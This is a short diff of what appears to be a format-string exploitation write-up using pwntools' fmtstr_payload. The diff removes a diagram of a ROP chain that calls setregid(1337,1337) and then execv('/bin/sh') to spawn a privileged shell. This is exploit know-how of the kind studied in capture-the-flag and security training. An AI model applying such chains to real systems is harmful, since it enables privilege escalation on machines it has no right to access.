@@ -399,36 +399,6 @@ fmtstr_payload(
 
 `write_size="byte"` uses `%hhn` writes.
 
-Advantages:
-
-- Smaller individual writes.
-- Lower required character count.
-- Fits inside the input buffer.
-
-## Stack execution flow
-
-After the format string write completes:
-
-```
-vuln()
- |
- | leave
- | ret
- v
-
-pop rdi
-1337
-pop rsi
-1337
-setregid()
-
-pop rdi
-"/bin/sh"
-pop rsi
-NULL
-execv()
-```
-
 The existing stack layout already matches the ROP chain layout. No stack pivot is required.
 
 ## Privilege handling
